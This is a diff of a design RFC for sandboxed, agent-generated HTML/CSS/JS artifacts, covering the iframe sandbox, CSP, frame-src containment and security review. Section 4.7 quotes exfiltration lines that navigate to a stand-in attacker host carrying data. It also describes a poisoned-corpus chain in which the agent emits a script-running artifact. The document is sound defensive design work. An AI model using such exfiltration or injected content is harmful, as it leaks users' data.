@@ -1,6 +1,13 @@
-# RFC — HTML Artifact Capability: agent-generated static HTML/CSS with a sandboxed preview
+# RFC — HTML Artifact Capability: agent-generated HTML/CSS/JS with a sandboxed preview
 
-**Status:** Draft for developer review
+**Status:** Shipped. Kept only as the design record for the capability's shape
+and the containment reasoning behind §4.7. **The JavaScript policy in this
+document is superseded**: script is no longer unconditional, it is granted per
+team. The current truth is
+`openspec/specs/html-artifact-javascript-policy/spec.md` (issue #2798); where the
+two disagree, that spec and the code win. This RFC has no open question left and
+is a candidate for archival once §4.7's containment rationale has a home in a
+compact doc.
 **Author:** Maxime Daragon
 **Date:** 2026-08-31
 **Area:** `fred-runtime` (new capability package), `frontend`
@@ -27,12 +34,13 @@ builtin renderer, or RFC covers HTML/CSS/web/artifact rendering (the only inline
 
 ## 2. Goals
 
-1. Give an agent one tool to emit a **static** HTML/CSS artifact.
+1. Give an agent one tool to emit a self-contained HTML/CSS/JS artifact.
 2. Render it live in a **dedicated viewer that opens to the right of the chat**,
    with a tabbed, **read-only** surface: **Preview** (rendered) / **HTML**
    (source) / **CSS** (source).
-3. Render untrusted, LLM-generated markup **safely** — no script execution, no
-   network egress, no access to the app's origin or storage.
+3. Render untrusted, LLM-generated markup **safely** — script runs isolated, with
+   no access to the app's origin or storage, and no network reach: subresources by
+   CSP, self-navigation by the shell's `frame-src` (§4.7).
 4. Let the user **download** the artifact as a self-contained `.html`.
 5. Reuse the shipped capability-presentation machinery (typed chat part +
    side panel + part-renderer registry) rather than inventing a parallel path;
@@ -42,14 +50,16 @@ builtin renderer, or RFC covers HTML/CSS/web/artifact rendering (the only inline
 
 ## 3. Non-goals (v1)
 
-- **No JavaScript.** The artifact is HTML + CSS only; the sandbox forbids script
-  execution regardless of what the model emits (§4.7).
+- **No external resources and no network.** JavaScript is allowed (amended
+  2026-09-24, §4.7), but the artifact must be self-contained: the CSP refuses
+  every remote subresource and every network call.
 - **No editing / no server-side persistence.** The viewer is read-only. There is
   no owned table, no router, no PUT. (Explicitly deferred — see §8.)
 - **No agent read-back.** The agent does not re-ingest a prior artifact to
   continue editing it (deferred with persistence).
 - **No per-agent configuration.** The capability needs no agent-creation config.
-- **Not a general web sandbox / not a code runner.** Static markup preview only.
+- **Not a general web sandbox / not a code runner.** No server-side execution, no
+  network reach — a page that runs its own inline script, nothing more.
 
 ---
 
@@ -126,7 +136,12 @@ A one-line always-on system note via a `middleware()` `wrap_model_call` override
 (mirrors `writable_document`'s `_WRITE_INSTRUCTIONS`): "When the user asks for a
 web page, component, mockup, or styled HTML, call `render_html_artifact` with the
 HTML and CSS; a rendered preview opens beside the chat — never paste the code into
-the chat. Emit static HTML/CSS only; no `<script>`, no external resources."
+the chat. Keep the artifact self-contained — no external resources and no network
+calls, which are blocked."
+
+Superseded in one respect: the fragment now has **two variants**, and which one is
+delivered follows the team's `allow_javascript` setting, so a team that may not
+run script is never offered it. See the capability spec (issue #2798).
 
 ### 4.6 Frontend — the viewer
 
@@ -152,7 +167,8 @@ mirroring the `writable_document` plugin:
     file, CSS inlined), plus **PNG** and **PDF** built from the SAME faithful
     render — the artifact is laid out off-screen, its DOM serialized, and rasterized
     through an `<svg><foreignObject>` loaded as an `<img>` (secure static mode: no
-    scripts, no external loads). PNG is that canvas; PDF wraps the canvas JPEG in a
+    scripts, no external loads — hence the pre-script capture warned about in
+    §4.7). PNG is that canvas; PDF wraps the canvas JPEG in a
     hand-assembled one-page document (no PDF library). Both capture the real
     background and add none of the browser print chrome. (Print-to-PDF was tried
     first and dropped: browsers omit backgrounds and inject header/footer/margins.)
@@ -176,61 +192,182 @@ the first thing the parser reaches and therefore governs EVERY author subresourc
 string feeds both the iframe `srcdoc` and the download blob. Author CSS is
 neutralized against a `</style>` breakout before it enters the `<style>` element.
 
-### 4.7 Security — no JS on any output path (the load-bearing part)
+### 4.7 Security — JS isolated on every output path (the load-bearing part)
 
-The markup is untrusted LLM output. NO output path — in-app preview, downloaded
-`.html`, or new browser tab — may run script, reach the network, touch the app
-origin, or navigate the top frame. Three **independent** layers enforce this, so
-it takes more than one failure to matter (`htmlArtifactDocument.ts`):
+**Amended 2026-09-24.** v1 forbade JavaScript outright and enforced that with
+three layers. The blanket prohibition is lifted: an artifact needs JS for tabs,
+accordions, animations and charts, and refusing it made the capability produce
+dead mockups. Script is **isolated rather than removed**, which changes what the
+layers are for — browser-enforced primitives contain script instead of three
+independent mechanisms deleting it. The superseded §6 alternative 5 ("Allow
+JavaScript — deferred") is hereby taken.
 
-**Layer A — content sanitization (travels with the artifact).** The single
-composition chokepoint (`composeHtmlDocument`) runs the author HTML through
-**DOMPurify** (already a repo dependency — no new runtime dep) before it is placed
-in the body. This strips every script-bearing construct from the markup *itself*,
-so even a downloaded file opened by double-click carries no executable JS,
-independent of whatever renders it. DOMPurify parses with the real browser DOM
-(handling mutation-XSS and parser differentials a regex cannot); its defaults drop
-`<script>`, `on*` handlers, and `javascript:`/unknown-protocol URLs, and we also
-`FORBID_TAGS` the egress/nested-content set (`iframe`, `object`, `embed`, `base`,
-`meta`, `link`). Author CSS is separately neutralized against a `</style>`
-breakout before it enters the `<style>` element.
+**Superseded 2026-09-25 (issue #2798).** "Every artifact frame is
+`sandbox="allow-scripts"`" below is no longer true, and neither is the assumption
+that every artifact executes. Script is granted **per team**: an opted-in team's
+artifact frame carries `allow-scripts`, and a restricted team's carries no token
+at all, so nothing executes. Everything else in this section still holds and
+applies to BOTH modes — in particular the CSP, which is what blocks egress from
+markup alone, and the shell plus `frame-src blob:`, which the download path needs
+regardless of posture. Read the rest with that substitution in mind; the spec
+under `openspec/specs/html-artifact-javascript-policy/` is the current contract.
 
-**Layer B — frame sandbox (browser-enforced, unbypassable by content).**
-- **Preview:** `<iframe sandbox="">` — empty attribute → ALL restrictions on, so
-  no `allow-scripts` (no JS at all: inline handlers, `<script>`, `javascript:`)
-  and no `allow-same-origin` (opaque origin, no `window.parent`/cookies/storage).
-  `srcdoc` (never `src` to an app URL) keeps the content inert same-document text;
-  `allow-top-navigation`/`allow-popups` are omitted too.
-- **New tab:** the tab's TOP document is a trusted, author-free shell whose only
-  body is that same `sandbox=""` iframe (`newTabDocument`), so the browser-enforced
-  guarantee holds there too — even though a `blob:` URL is same-origin with the app,
-  the only same-origin document carries no author markup. Opened `noopener`.
+The markup is untrusted LLM output and it executes. Isolation rests on two
+mechanisms, both enforced by the browser and unbypassable by content
+(`htmlArtifactDocument.ts`):
 
-**Layer C — CSP (independent egress/script backstop).** A restrictive
-`<meta http-equiv>` in every composed document:
-`default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:;
-base-uri 'none'; form-action 'none'`. No external fetch, images/fonts only as
-`data:`; `'unsafe-inline'` is styles-only and safe with scripts disabled. It is
-emitted FIRST in the head (author markup always goes in our body, never spliced
-into an author `<head>`), so it governs every author subresource — a meta CSP only
-applies to content parsed after it.
+**Three mechanisms, and the third is not optional.**
 
-The layers are independent by design: A removes JS from the markup, B stops the
-frame from executing any that survived, C blocks script/egress even absent the
-sandbox. Any one of the three alone already prevents script execution in the
-preview.
+**1. The frame sandbox.** Every artifact frame is `sandbox="allow-scripts"` and
+**never** `allow-same-origin`. The pair is the one combination that must never
+ship: together they let the content clear its own sandbox and reach the app's
+DOM, cookies and storage. With `allow-scripts` alone the artifact holds an opaque
+origin — no `window.parent`, no app storage, no cookies — and
+`allow-top-navigation`/`allow-popups` stay omitted. The single token lives in one
+exported constant, `ARTIFACT_SANDBOX`, asserted by tests in
+`htmlArtifactDocument.test.ts` and `HtmlArtifactPane.sandbox.test.tsx`.
 
-**Verification** (§10): `htmlArtifactDocument.test.ts` runs a table of known
-injection vectors (script tag, `on*` handlers, `javascript:`/`vbscript:` URLs,
-`object`/`embed`/`base`/`meta refresh`, SVG script/onload, mutation-XSS) through
-`composeHtmlDocument` and asserts none survive, plus the sandboxed-shell shape;
-`HtmlArtifactPane.sandbox.test.tsx` renders the pane and asserts the preview
-iframes are `sandbox=""` with no `allow-scripts`/`allow-same-origin` (a
-regression guard). These run under **jsdom** (a test-only devDependency —
-happy-dom's partial DOM silently breaks DOMPurify, so the tests would pass
-without proving anything). A real-browser execution canary (Playwright) was
-scoped out to avoid adding e2e infra the repo does not have; the sandbox is a
-browser primitive already guaranteed without it.
+**2. The CSP.** A restrictive `<meta http-equiv>` in every composed document:
+`default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
+img-src data:; font-src data:; base-uri 'none'; form-action 'none'; webrtc 'block'`.
+Inline script runs; no **subresource fetch** of any kind succeeds — no fetch, XHR,
+WebSocket, `sendBeacon`, `<a ping>`, remote script, stylesheet, font or image — and
+`webrtc 'block'` closes the one egress API that no fetch directive covers.
+'unsafe-eval' is deliberately absent, so `eval`/`new Function` throw and
+`setTimeout("string")` silently never runs; the prompt fragment tells the model so.
+The author markup always goes in OUR body, never spliced into an author `<head>`,
+so the meta is the first thing the parser reaches and governs every author
+subresource and script (a meta CSP only applies to content parsed after it).
+
+**3. `frame-src blob:` on the enclosing shell — the one that was missing.** A CSP
+governs *subresource fetches*; it has never governed a document **navigating
+itself**, and `navigate-to` was specced and then dropped, so no directive an
+artifact carries can stop `location.href = "https://attacker/?d=" + data`. A
+sandboxed browsing context may always navigate itself: the sandbox flag prevents
+navigating contexts *other than* itself. Worse, the sandbox attribute survives that
+navigation and the CSP does not — CSP is per-document and inherits only across local
+schemes — so one assignment replaces the artifact with an attacker page holding
+unrestricted `fetch()`, rendered inside the Fred UI with no URL bar to contradict it.
+
+The control therefore has to sit on the **parent** document, and the artifact has to
+arrive by a URL `frame-src` can match — hence the shell hands it to the child frame
+as a `blob:` URL rather than inline `srcdoc`, which offers `frame-src` nothing to
+match. The blob document **inherits the shell's policy** (CSP propagates across
+local schemes), so the shell carries the full artifact policy plus `frame-src blob:`.
+
+Measured in Chrome 153 against a local listener, in the production nesting shape and
+on `file://` alike: without the directive an artifact doing
+`location.href="http://host/?d=SECRET"` produced `GET /?d=SECRET`; with it, **zero
+requests while its script still ran**. Both halves matter — an earlier candidate,
+`frame-src 'none'`, produced zero requests *because it blocked the artifact frame
+outright*, which would have removed the feature rather than secured it.
+
+**A residual that content filtering narrows but does not close.** `<link
+rel="preconnect">` and `rel="dns-prefetch"` perform no fetch, so no CSP directive
+reaches them, and they egress a hostname (DNS + SNI) **even from a frame that cannot
+run script** — measured. `composeHtmlDocument` therefore **renames** the element to
+`<x-link>` rather than deleting it. Deleting needs a closing `>` an author can simply
+withhold, and cutting text out can splice a fresh `<link` together from what
+surrounded the hole; both were measured egressing in Chrome 153, and the first also
+went out through the PNG/PDF frame, whose only other isolation is that script cannot
+run. Renaming leaves an unknown element however the tag terminates.
+
+What this does **not** cover is script: an artifact can append a live `<link>` at
+runtime, which no markup pass can see. On the three scripting paths the hostname
+channel therefore stays open. Content filtering is the only one left here, and it
+exists because policy cannot express this at all.
+
+An opaque origin also means `localStorage`, `sessionStorage` and cookies are
+unavailable and **throw** on access. That is a consequence of the isolation, not a
+bug to work around: the prompt fragment and the tool docstring tell the model to
+keep artifact state in JavaScript variables.
+
+Content sanitization (the former Layer A, DOMPurify) is **retired**: its entire
+purpose was removing the script we now want, and keeping it would silently break
+every interactive artifact. Author CSS is still neutralized against a `</style>`
+breakout — cheap, and it keeps the style element well-formed.
+
+**Every output path, and what covers it.** The sandbox argument is only sound
+path by path; three of the five have no application frame to rely on:
+
+| Path | Frame | Isolation |
+| --- | --- | --- |
+| In-app preview | shell → `sandbox="allow-scripts"` + `blob:` child | sandbox + CSP + `frame-src` |
+| New browser tab | shell → `sandbox="allow-scripts"` + `blob:` child | sandbox + CSP + `frame-src` |
+| `.html` download | shell → `sandbox="allow-scripts"` + `blob:` child | sandbox + CSP + `frame-src` |
+| PNG export | `sandbox="allow-same-origin"`, no scripts | script cannot run; `<link>` defused |
+| PDF export | `sandbox="allow-same-origin"`, no scripts | script cannot run; `<link>` defused |
+| **Copy to clipboard** | none — plain text handed to the user | **the user's own judgement** |
+
+The clipboard is a real sixth path and is not contained by any of the above: Copy
+hands over the readable composed document, author script included, because that is
+what Copy is for — the source already shown in the HTML/CSS tabs, in a form someone
+can edit or host. Pasted into a CMS HTML field it is that site's problem, on that
+site's origin. It stays deliberately unwrapped; the download is the wrapped one.
+
+**All three scripting paths share one trusted shell** (`sandboxedShellDocument`), an
+author-free top document that bootstraps the artifact into a `blob:`-URL child frame.
+Two reasons, and the first applied from v1: the artifact may never BE the top
+document of its origin, because a `blob:` URL is same-origin with the app and a saved
+file opened by double-click is the top document on `file://`. The second is the
+`frame-src` above, which is why the preview was moved into the shell too rather than
+rendering the artifact directly.
+
+The downloaded `.html` is therefore a bootstrap wrapper, not editable markup: it
+renders correctly anywhere, but someone who wants source to edit or host should use
+the HTML/CSS tabs or Copy. The Help Center says so.
+
+**The guarantee is browser-scoped.** It rests on `sandbox` and CSP being honoured.
+A saved artifact opened by an embedded renderer that ignores them — some Electron
+apps, mail preview panes, HTML-to-PDF pipelines — gets none of it.
+
+The **PNG/PDF export** frame is the one that grants `allow-same-origin`, because
+rasterizing must read `contentDocument`. It must therefore never gain
+`allow-scripts`; without it the browser refuses to run the artifact's script
+whatever the CSP says. The consequence is functional, not a weakness: a JS-driven
+artifact rasterizes in its **pre-script state**, and the viewer says so with an
+info toast when the artifact carries script. The token is an exported constant,
+`MEASURE_SANDBOX`, frozen by a test.
+
+**Verification** (§10): `htmlArtifactDocument.test.ts` asserts author script
+survives composition intact (a sanitizer regression would break every interactive
+artifact), that the CSP permits inline script while refusing egress, that the
+shell never grants `allow-same-origin`, and that the download ships the shell with
+the artifact escaped one level down; `HtmlArtifactPane.sandbox.test.tsx` pins the
+preview frames' attribute. Each guard was falsified by mutation before being
+trusted — adding `allow-same-origin`, shipping the bare document on download, and
+dropping `script-src` each fail the suite. A real-browser execution canary
+(Playwright) remains out of scope; the sandbox is a browser primitive.
+
+**Revising replaces, and a view can be closed (2026-09-24).** `artifact_id` existed
+from v1 but the model had to remember it from its own tool output, which it did not
+do reliably — so "change the heading" opened a second view. Revising is now the
+DEFAULT: an omitted `artifact_id` targets the artifact already in the viewer, and
+`new_artifact=true` is what opens a separate one. Because capability middleware is
+rebuilt per turn, the open id cannot be held in memory; it is recovered from the
+transcript (the tool announces it in its own result text) and named in the prompt
+overlay, so the model is told the id rather than asked to recall it. The viewer's
+tabs each carry a close control; a closed artifact keeps its snapshot so its chat
+card reopens it, and a close is undone by a genuine new revision but not by a
+same-content replay of the card.
+
+**Deliberately not mitigated (decided 2026-09-24).** An artifact opens and runs on
+arrival, with no user gesture. So the chain "poisoned document in the team corpus →
+the agent emits an artifact → its script runs" needs no click, and a run gate was
+considered and **declined: the friction falls on every artifact, and almost all of
+them are exactly what the user asked for.** What that leaves an unrequested artifact
+able to do, given the containment above: burn CPU in its own frame (the preview
+keeps two buffers alive, so twice over), and display something misleading to social-
+engineer the reader. It cannot send anything out, read local files, or reach the app.
+The reader does get a **stop control** instead, which is the same protection moved
+to where it costs nothing: the viewer offers "Stop the page" whenever the artifact
+can execute, and it works by UNMOUNTING the preview frames, so the browsing contexts
+are destroyed and scripts, timers and workers stop with them. A gate charges every
+artifact for the rare bad one; a stop charges only the bad one. It does not prevent
+the first moments of execution, so it answers the runaway page and the misleading
+page, not a payload that does its damage on load — which the containment above is
+what actually covers. Revisit the gate if that containment ever weakens: it is the
+only mitigation here that does not depend on a browser behaving as specified.
 
 This is a **security-sensitive change** and must go through `/security-review`
 before merge (§10).
@@ -261,9 +398,11 @@ phase's "smaller, single-purpose, more deletion than addition." The editable v2
    composes only at render/download.
 4. **`MermaidBlock`-style inline `dangerouslySetInnerHTML` render.** Rejected:
    unsandboxed; unacceptable for arbitrary LLM HTML/CSS (XSS/exfiltration).
-5. **Allow JavaScript (full artifacts).** Deferred: large security surface
-   (needs `allow-scripts`, a hardened CSP, and threat review). v1 is static; the
-   design leaves room to widen the sandbox later without a rewrite.
+5. **Allow JavaScript (full artifacts).** Deferred in v1, **taken 2026-09-24**:
+   the design did leave room to widen the sandbox without a rewrite, and that is
+   what happened — `allow-scripts` on the artifact frames, `script-src
+   'unsafe-inline'` added to the CSP, the sanitizer retired, and the download moved
+   onto the same sandboxed shell as the new tab (§4.7).
 
 ---
 
@@ -319,11 +458,31 @@ this is an extension, not a rewrite.
 ## 10. Security review
 
 The sandbox/CSP in §4.7 is the correctness-critical part. Before merge: run
-`/security-review` on the diff, with explicit attention to — script execution
-blocked (inline handlers, `<script>`, `javascript:`), no `allow-same-origin`, no
-network egress, no top-navigation, and correct CSP composition for both full
-documents and wrapped fragments. Ship no artifact preview that can execute script
-or reach the app origin.
+`/security-review` on the diff.
+
+**Amended 2026-09-24**, since script is now allowed (§4.7) and this section
+previously asked the reviewer to confirm the opposite. What to check now:
+
+- `allow-same-origin` appears on no frame that can run script, and nowhere at all
+  alongside `allow-scripts`;
+- the enclosing shell carries `frame-src blob:` and the artifact arrives as a
+  `blob:` URL — the pair is what blocks self-navigation, and each half is useless
+  without the other;
+- no **egress** from an artifact frame, which is not the same question as "can it
+  run script": `<link rel=preconnect>`, WebRTC and self-navigation each bypass a
+  fetch-directive-only reading of the policy;
+- the `allow-*` tokens that are deliberately omitted (`popups`, `top-navigation`,
+  `modals`, `downloads`, `forms`, `same-origin`) are still omitted;
+- correct CSP composition for both full documents and wrapped fragments.
+
+**Test what a browser decides, not only what the code composes.** The claim that
+needed a real browser was never the sandbox — that is a browser primitive — but the
+CSP's coverage of *navigation*, and a string-composition suite cannot reach it. A
+single headless-Chrome assertion (artifact attempts egress; no request reaches a
+local listener; a paired control proves the harness would have seen one) is the
+load-bearing check, and one round of it found a full-bandwidth exfiltration path
+that the unit suite passed. Automating it is deliberately still out of scope — the
+repo has no e2e infrastructure — so it is a manual gate on this section.
 
 ---
 
